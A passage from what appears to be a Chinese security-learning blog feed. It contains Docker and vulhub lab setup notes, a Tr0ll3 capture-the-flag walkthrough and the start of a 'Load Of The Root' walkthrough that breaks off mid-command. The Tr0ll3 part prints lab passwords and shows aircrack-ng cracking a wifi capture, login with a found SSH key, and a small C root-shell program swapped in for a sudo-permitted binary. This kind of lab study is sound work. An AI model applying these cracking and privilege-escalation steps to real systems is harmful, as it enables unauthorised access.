查找sqli-labs镜像</span><br><span class="line">docker pull     acgpiano/sqli-labs  拉取镜像到本地</span><br><span class="line">docker images  查看已有的镜像</span><br><span class="line">docker run -dt --name sqli -p     80:80 --rm acgpiano/sqli-labs</span><br><span class="line">-dt  让其在后台运行</span><br><span class="line">--name  给其命名</span><br><span class="line">-p  本地端口：docker中的端口是将docker的端口映射到本地端口</span><br><span class="line">--rm  当其关闭后将删除开启的资源</span><br><span class="line">docker ps -a 显示容器container容器的id image 命令 端口等信息</span><br><span class="line">docker exec -it （id号）     /bin/bash  进入id号的shell</span><br></pre></td></tr></table></figure><h2 id="Docker的基本使用"><a href="#Docker的基本使用" class="headerlink" title="Docker的基本使用"></a>Docker的基本使用</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker images    查看存在的镜像</span><br><span class="line">docker image rm &lt;id&gt;    删除镜像</span><br><span class="line">docker run -dt --name sqli -p 80:80 --rm acgpiano/sqli-labs    运行存在的镜像</span><br><span class="line">docker exec -it &lt;container ID&gt; /bin/bash    进入运行中的容器</span><br><span class="line">docker run -it --rm ubuntu /bin/bash    运行存在的镜像，并以交互的方式进入容器，运行完删除容器</span><br><span class="line">docker ps    docker container ls    查看运行中的容器</span><br><span class="line">docker stop &lt;container ID&gt;    停止指定的容器，不指定为停止所有容器</span><br><span class="line">docker rm    删除所有的容器</span><br><span class="line">docker container [stop/start/restart]    停止/开启/重启容器</span><br><span class="line">docker container kall &lt;container ID&gt;    强制停止容器</span><br><span class="line">docker commit -p &lt;container ID&gt; container-backup    创建Docker的快照</span><br><span class="line"></span><br><span class="line">把宿主机文件拷到容器里面</span><br><span class="line">docker cp 要拷贝的文件路径 容器名: 要拷贝到容器里面对应的路径</span><br><span class="line"></span><br><span class="line">容器里面拷文件到主机</span><br><span class="line">docker cp 容器名: 要拷贝的文件在容器中的路径 要拷贝到宿主机器的响应路径</span><br></pre></td></tr></table></figure><h2 id="安装vulhub"><a href="#安装vulhub" class="headerlink" title="安装vulhub"></a>安装vulhub</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#记得选好安装路径</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br></pre></td></tr></table></figure><p>下载好后，进入目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd vulhub</span><br></pre></td></tr></table></figure><p>拉取漏洞环境，比如struts2</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd struts2</span><br></pre></td></tr></table></figure><p>举例S2-001</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd s2-001</span><br></pre></td></tr></table></figure><p>然后执行命令，开启struts2-001漏洞</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br><span class="line">sudo docker ps    查看运行中的容器环境</span><br></pre></td></tr></table></figure><p>访问漏洞环境</p><p>访问 ip地址:8080</p><p>注意：如果没有回显可以加一些参数比如index</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker stop （id号）</span><br></pre></td></tr></table></figure><p>如果想要再次执行，可以输入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d -p 8080:8080 medicean/vulapps:s_struts2_s2-001</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 环境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSCP-003-Troll</title>
      <link href="/2024/04/28/OSCP-003-Troll/"/>
      <url>/2024/04/28/OSCP-003-Troll/</url>
      
        <content type="html"><![CDATA[<p><strong>kali：192.138.174.137</strong></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.174.0/24</span><br><span class="line">或</span><br><span class="line">arp-scan -l</span><br><span class="line">或</span><br><span class="line">netdiscover -i eht0#比较慢</span><br></pre></td></tr></table></figure><p>发现目标主机：<strong>192.168.174.156</strong></p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A -p- 192.168.174.156</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240428225714640.png" alt="image-20240428225714640"></p><p>只开放了22端口，昨天刚做完ssh敲门，试了下没什么提示，去搜别人的wp，发现它们能扫出来3个端口，嗯？，是我配置环境有问题吗。试试下面这个命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p22 --script &quot;default or safe&quot; 192.168.174.156</span><br></pre></td></tr></table></figure><ol><li>“default”脚本：这个脚本是nmap的默认脚本之一，用于执行一系列常规的端口扫描和服务探测。如开放的端口、运行的服务和版本等。</li><li>“safe”脚本：这个脚本也是nmap的内置脚本之一，它执行一些安全性相关的扫描任务。它会检查目标主机是否存在已知的安全漏洞、弱密码、常见的网络配置错误等。</li></ol><p>扫描完也没有发现什么信息，点开之前打卡的靶机，发现</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Are you sure you want to do this? Login: start :here</span><br></pre></td></tr></table></figure><p>试着登陆一下，发现真登上去了。。。</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>登陆上shell后，id查看权限,ls -a看当前目录有什么文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">start@Tr0ll3:~$ ls</span><br><span class="line">bluepill  redpill</span><br><span class="line">start@Tr0ll3:~$ id</span><br><span class="line">uid=1001(start) gid=1001(start) groups=1001(start)</span><br></pre></td></tr></table></figure><p>找到了两个文件，分别看看里面的内容,里面各有一个文件</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#为了安全，先看看文件类型</span></span><br><span class="line">file file_awesome_work</span><br><span class="line">file this_weill_surely_work</span><br></pre></td></tr></table></figure><ul><li>-b 　列出辨识结果时，不显示文件名称。</li><li>-c 　详细显示指令执行过程，便于排错或分析程序执行的情形。</li><li>-f&lt;名称文件&gt; 　指定名称文件，其内容有一个或多个文件名称时，让file依序辨识这些文件，格式为每列一个文件名称。</li><li>-L 　直接显示符号连接所指向的文件的类别。</li><li>-m&lt;魔法数字文件&gt; 　指定魔法数字文件。</li><li>-v 　显示版本信息。</li><li>-z 　尝试去解读压缩文件的内容。</li><li>[文件或目录…] 要确定类型的文件列表，多个文件之间使用空格分开，可以使用shell通配符匹配多个文件。</li></ul><p>再分别看两个文件的内容</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#cat filename</span></span><br><span class="line">start@Tr0ll3:~$ <span class="built_in">cat</span> bluepill/awesome_work </span><br><span class="line">http://bfy.tw/ODa</span><br><span class="line">start@Tr0ll3:~$ <span class="built_in">cat</span> redpill/this_will_surely_work </span><br><span class="line">step2:Password1!</span><br></pre></td></tr></table></figure><p>一个是网址，一个看起来像是账号密码</p><p>这里有个知识点</p><h3 id="短链接还原"><a href="#短链接还原" class="headerlink" title="短链接还原"></a>短链接还原</h3><p>找了下，一些在线网站都挂了，但发现curl可以直接返回</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -IL 链接</span><br><span class="line"> https://www.lmgtfy.app/?q=how+do+you+make+a+hacker+waste+time%3F</span><br></pre></td></tr></table></figure><p>说是在浪费时间，估计正确的步骤是登陆另一个账户</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh step2@192.168.174.156</span><br></pre></td></tr></table></figure><p>密码输入，却说没有权限，试试在start那里提权试试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -type f -perm 0777 2&gt;/dev/null</span><br></pre></td></tr></table></figure><ol><li><code>-type f</code>：该选项指定只搜索文件，而不搜索目录或其他类型的文件（如符号链接）。</li><li><code>-perm 0777</code>：该选项指定要搜索的文件的权限。在这种情况下，它查找权限设置为0777的文件。权限值0777表示具有读取、写入和执行权限的文件。</li></ol><p>找到两个结果</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/log/.dist-manage/wytshadow.cap</span><br><span class="line">/.hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed/almost/there/jk/no/seriously/last/one/rofl/ok/ill/stop/however/this/is/fun/ok/here/rofl/sorry/you/made/it/gold_star.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这些目录构成了一句话，且hint是线索，看下那个txt文件里有什么信息</p><p>看起来像个密码字典，而第一个文件是一个数据包文件，我们先把他们复制到自己本机当前目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#在本机kali执行以下两条命令</span><br><span class="line">scp 192.168.56.152:/var/log/.dist-manage/wytshadow.cap .</span><br><span class="line"></span><br><span class="line">scp start@192.168.56.152:/.hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed/almost/there/jk/no/seriously/last/one/rofl/ok/ill/stop/however/this/is/fun/ok/here/rofl/sorry/you/made/it/gold_star.txt .</span><br></pre></td></tr></table></figure><h3 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h3><ul><li><strong>-n</strong> 禁止IP名称解析。</li><li><strong>-nn</strong> 禁止IP和端口名称解析。</li><li><strong>-i</strong> 指定捕获哪个网卡的网络数据包。</li><li><strong>-w</strong> 指定将包写入哪个文件，如果文件不存在则创建该文件；如果存在则覆盖其内容。</li><li><strong>-f</strong> 指定过滤表达式，例如指定捕获哪个端口，哪个协议等。</li><li><strong>-r</strong> 指定从哪个文件读取网络数据包文件。</li><li><strong>-F</strong> 指定使用哪个文件的过滤表达式抓包。</li><li><strong>-D</strong> 列出所有可以使用tcpdump抓包的网卡。</li><li><strong>-c</strong> 指定捕获或者读取包的个数，**-c**后面直接接数字即可。</li><li><strong>-l</strong> 抓包时保存到文件的同时查看包的内容。</li><li><strong>-t</strong> 不打印时间戳。</li><li><strong>-tt</strong> 秒级时间戳。</li><li><strong>-ttt</strong> 打印时间戳到微秒或者纳秒，取决于 <strong>–time-stamp-precision option</strong> 选项。</li><li><strong>-s</strong> 指定每个包捕获的字节数。</li><li><strong>-S</strong> 打印绝对的tcp序列号，而不是相对的序列号。</li><li><strong>-v&#x2F;-vv&#x2F;-vvv</strong> 打印详细信息，v的个数越多， 打印内容越详细。</li></ul><p>然后我们可以用这个命令来查看数据包的内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcpdump -nnttttAr wytshadow.cap | less -Sr</span><br></pre></td></tr></table></figure><ul><li><code>tcpdump</code>：这是用于网络流量捕获和分析的命令行工具。</li><li><code>-n</code>：此选项告诉 tcpdump 不要将 IP 地址解析为主机名，而是显示 IP 地址。</li><li><code>-ntttt</code>：这些选项修改 tcpdump 的输出格式，使其显示更多的时间戳信息。每个 <code>t</code> 表示增加一个时间戳字段，总共有 5 个 <code>t</code>，表示显示五个时间戳字段。</li><li><code>-Ar wytshadow.cap</code>：这部分指定要分析的捕获文件名为 <code>wytshadow.cap</code>。<code>-A</code> 选项表示以 ASCII 文本形式显示数据包内容，而不是以十六进制显示。</li><li><code>less -Sr</code>：<code>less</code> 是一个分页浏览器，用于查看长文本输出。<code>-S</code> 选项告诉 <code>less</code> 在折行时不折断长行，而是横向滚动显示内容。</li></ul><p>发现是<strong>802.11协议</strong>，是wifi的协议，可能是wifi密码，可以用aircrack破解</p><p>scp完后这两个文件就被考到自己的目录下了，然后用txt作为字典，去破解cap包里的密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aircrack-ng -w gold_star.txt wytshadow.cap</span><br></pre></td></tr></table></figure><p>经过漫长的等待，发现密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wytshadow:gaUoCe34t1</span><br></pre></td></tr></table></figure><p>去连接以下这个用户</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh sytshadow@192.168.174.156</span><br></pre></td></tr></table></figure><p>然后发现目录下有个oohfun文件，file一下发现是ELF文件，linux下的可执行文件，执行以下一直打印，Lynx 是一个文本模式的 Web 浏览器，线索说明可能和浏览器相关</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iM Cr@zY L1k3 AAA LYNX</span><br></pre></td></tr></table></figure><p>让我们试试sudo -l看下有什么我们（执行 sudo 的使用者）的权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l输入密码后</span><br><span class="line">env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User wytshadow may run the following commands on Tr0ll3:</span><br><span class="line">    (root) /usr/sbin/service nginx start</span><br></pre></td></tr></table></figure><p>这说明我们有可能启动nginx，sites-enabled 目录中存放的是链接文件，每个链接文件都指向 sites-available 目录中的配置文件，表示需要让 Nginx 启用哪些配置代理文件。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /etc/nginx/site-enable</span><br><span class="line">cat default</span><br></pre></td></tr></table></figure><p>看下网页有什么信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        listen 8080 default_server;</span><br><span class="line">        listen [::]:8080 default_server;</span><br><span class="line">                if ($http_user_agent !~ &quot;Lynx*&quot;)&#123;</span><br><span class="line">    return 403;</span><br><span class="line">&#125;</span><br><span class="line"> root /var/nginx/www;</span><br></pre></td></tr></table></figure><p>这里有两个信息，我们不妨先根据前面的lynx的线索，去看看8080端口有什么提示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -antp#列出所有当前系统上的 TCP 连接，并显示每个连接的本地地址、外部地址、状态以及关联的进程信息</span><br></pre></td></tr></table></figure><p>发现没有相关信息，可能是服务没启动，我们启动下nginx服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo start service nginxs</span><br></pre></td></tr></table></figure><p>再看看就可以发现有相关连接了，新建一个terminal，去看看这个服务的具体信息，结合前面的lynx说明我们可以利用这个命令访问一下这个网页</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lynx 192.168.174.156:8080</span><br></pre></td></tr></table></figure><p>得到一个新的账号</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">genphlux:HF9nd0cR!  </span><br></pre></td></tr></table></figure><p>继续ssh连接，感觉就是一个ssh的无线套娃</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">genphlux@Tr0ll3:~$ file maleus </span><br><span class="line">maleus: PEM RSA private key</span><br><span class="line">genphlux@Tr0ll3:~$ file xlogin </span><br><span class="line">xlogin: HTML document, ASCII text</span><br></pre></td></tr></table></figure><p>一个RSA私钥和一个什么login文件，前面那个文件里就是正常的密钥，而xlogin文件里面好像是一个网页</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD HTML 3.2 Final//EN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Index of /xlogin<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Index of /xlogin<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">th</span> <span class="attr">valign</span>=<span class="string">&quot;top&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/icons/blank.gif&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;[ICO]&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;?C=N;O=D&quot;</span>&gt;</span>Name<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;?C=M;O=A&quot;</span>&gt;</span>Last modified<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;?C=S;O=A&quot;</span>&gt;</span>Size<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;?C=D;O=A&quot;</span>&gt;</span>Description<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">th</span> <span class="attr">colspan</span>=<span class="string">&quot;5&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">hr</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">&quot;top&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/icons/back.gif&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;[PARENTDIR]&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/&quot;</span>&gt;</span>Parent Directory<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="symbol">&amp;nbsp;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>  - <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="symbol">&amp;nbsp;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">&quot;top&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/icons/unknown.gif&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;[   ]&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;maleus&quot;</span>&gt;</span>maleus<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>2015-06-18 00:27  <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>1.6K<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="symbol">&amp;nbsp;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">th</span> <span class="attr">colspan</span>=<span class="string">&quot;5&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">hr</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">address</span>&gt;</span>Apache/2.4.29 (Ubuntu) Server at 127.0.0.1 Port 80<span class="tag">&lt;/<span class="name">address</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>都先保存到本地去看看,网页打开也是下载maleus文件，所以关键还是那个密钥文件，猜测用户名可能就是文件名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim sshkey</span><br><span class="line">chmod 600</span><br><span class="line">ssh maleus@192.168.174.156 -i sshkey#学到了，用私钥登陆ssh</span><br></pre></td></tr></table></figure><p>成功登陆，发现当前目录又是一个dont_even_bother的elf文件，执行以下说要输入密码，这时候又是神之一手</p><h3 id="strings"><a href="#strings" class="headerlink" title="strings"></a>strings</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strings dont_even_bother</span><br></pre></td></tr></table></figure><p>strings 命令用于扫描二进制文件（如可执行文件、共享库、目标文件等），并提取其中的可打印字符串。这些字符串可能是程序中的文本、错误消息、调试信息、配置参数等。使用 strings 命令可以帮助分析二进制文件，查找其中的文本内容或敏感信息。</p><p>学到了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xl8Fpx%6</span><br><span class="line"> Correct Password </span><br><span class="line"></span><br><span class="line"> Your reward is just knowing you did it! :-P </span><br></pre></td></tr></table></figure><p>然后我们ll以下，会发现多了个文件.viminfo，cat一下内容可以发现maleus的密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">B^slc8I$</span><br></pre></td></tr></table></figure><p>sudo -l查看自己可用的权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Matching Defaults entries for maleus on Tr0ll3:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User maleus may run the following commands on Tr0ll3:</span><br><span class="line">    (root) /home/maleus/dont_even_bother</span><br></pre></td></tr></table></figure><p>提示我们通过个elf文件达到root权限，也快拿到了Tr0ll3的权限了，怎么做呢,我们可以删除这个文件，重新新建一个c文件，返回root的bash</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span>  /home/maleus/dont_even_bother</span><br><span class="line">vim /home/maleus/dont_even_bother</span><br></pre></td></tr></table></figure><p>然后输入一下代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">        setgid(<span class="number">9</span>);</span><br><span class="line">        setuid(<span class="number">0</span>);</span><br><span class="line">        execl(<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;sh&quot;</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">gcc dont_even_bother.c -dont_even_bother</span><br></pre></td></tr></table></figure><p>因为maleus对这个文件具有root权限，所以可以通过修改这个文件，让他调用系统函数来达到提升权限的目的，然后就是去root目录下找flag了。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You are truly a Jedi!</span><br><span class="line"></span><br><span class="line">Twitter Proof:</span><br><span class="line"></span><br><span class="line">Pr00fThatTh3L33tHax0rG0tTheFl@g!!</span><br><span class="line"></span><br><span class="line">@Maleus21</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> OSCP </tag>
            
            <tag> 短链接还原 </tag>
            
            <tag> tcpdump </tag>
            
            <tag> strings </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Load Of The Root</title>
      <link href="/2024/04/26/Load-Of-The-Root/"/>
      <url>/2024/04/26/Load-Of-The-Root/</url>
      
        <content type="html"><![CDATA[<h1 id="Load-Of-The-Root参考"><a href="#Load-Of-The-Root参考" class="headerlink" title="Load Of The Root参考"></a>Load Of The Root<a href="https://blog.csdn.net/shenyu_1126/article/details/109744016">参考</a></h1><p>kali：192.168.174.137</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><p><strong>nmap -sn 192.168.174.0&#x2F;24</strong></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240426141555420.png" alt="image-20240426141555420"></p><p><strong>获得目标地址：192.168.174.151</strong></p><p>再次复盘时，不知道为什么nmap扫不到了，但用arp-sacn -l确找的得到，去搜了下区别又学到了一些<a href="https://blog.csdn.net/qq_63442530/article/details/137023387">扫描方法</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..254&#125;; <span class="keyword">do</span> ping -c 1 -w 0.1 192.168.174.<span class="variable">$i</span>|grep from; <span class="keyword">done</span></span><br></pre></td></tr></table></figure><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><strong>nmap -sS -A -n 192.168.174.151</strong></p><ul><li><code>-sS</code>: 这个参数指定使用TCP SYN扫描（半开放扫描）</li><li><code>-A</code>: 这个参数启用操作系统探测、版本探测、脚本扫描和traceroute等一系列高级扫描技术。使用”-A”参数相当于同时启用了”-O”（操作系统探测）、”-sV”（版本探测:识别目标主机上运行的服务和应用程序的版本信息。）和”–script”（脚本扫描）参数。这样可以提供更丰富的扫描结果和更全面的主机信息。</li><li><code>-n</code>: 这个参数禁用DNS解析。如前面解释所述，禁用DNS解析可以加快扫描速度并避免由于DNS问题引起的延迟和失败。使用”-n”参数后，nmap将只显示IP地址而不提供主机名信息。</li></ul><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240426143222105.png" alt="image-20240426143222105"></p><p><strong>发现只开放了一个22端口</strong></p><p><strong>尝试连接一下</strong></p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>只有一个22端口，暂时做不了目录扫描</p><h2 id="ssh远程连接"><a href="#ssh远程连接" class="headerlink" title="ssh远程连接"></a>ssh远程连接</h2><p>连接22端口获得提示<br>knock ftiend to enter（敲门进入）<br>Easy as 1,2,3</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240426143540944.png" alt="image-20240426143540944"></p><p>应该是在提示port_knocking（端口试探）的概要。<br>端口试探的主要目的是防止攻击者通过对端口扫描的方式对主机进行攻击。<br>端口试探是一种通过尝试连接，从外部打开原先关闭端口的方法。一旦收到正确顺序的尝试连接，防火墙就会打开一些特定的端口允许尝试连接的主机访问。<br>根据上面提示，我们尝试连接顺序连接1,2,3端口</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">knock是一个用于发送端口序列以触发特定行为的工具。它的工作原理是发送一系列的网络请求（称为<span class="string">&quot;击打&quot;</span>）到指定的主机和端口组合上。通过按照指定的顺序发送这些请求，可以触发防火墙规则、端口转发或其他网络设备上的特定行为。</span><br><span class="line"></span><br><span class="line">命令中的参数解释如下：</span><br><span class="line"></span><br><span class="line">&lt;主机&gt;：目标主机的名称或IP地址。</span><br><span class="line">&lt;端口[:协议]&gt;：指定要进行击打的端口和协议。可以指定一个或多个端口，以冒号分隔端口号和协议（TCP或UDP）。可以使用TCP或UDP协议，默认情况下使用TCP。</span><br><span class="line">其他选项的解释如下：</span><br><span class="line"></span><br><span class="line">-u, --udp：指定所有端口都使用UDP方式进行击打。</span><br><span class="line">-d, --delay &lt;t&gt;：在每个端口之间设置等待时间，以毫秒为单位。</span><br><span class="line">-4, --ipv4：强制使用IPv4地址。</span><br><span class="line">-6, --ipv6：强制使用IPv6地址。</span><br><span class="line">-v, --verbose：显示详细信息，提供更多的输出。</span><br><span class="line">-V, --version：显示knock的版本信息。</span><br><span class="line">-h, --<span class="built_in">help</span>：显示帮助信息。</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">knock -v 192.168.16.137 1 2 3</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240426144003787.png" alt="image-20240426144003787"></p><p>再次进行端口扫描</p><p>nmap -p- </p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240426144405510.png" alt="image-20240426144405510"></p><p>发现一个1337端口</p><p>这里看别的wp，发现了另一种写法</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> $(<span class="built_in">seq</span> 1 3 ) ; <span class="keyword">do</span> nmap 192.168.0.4 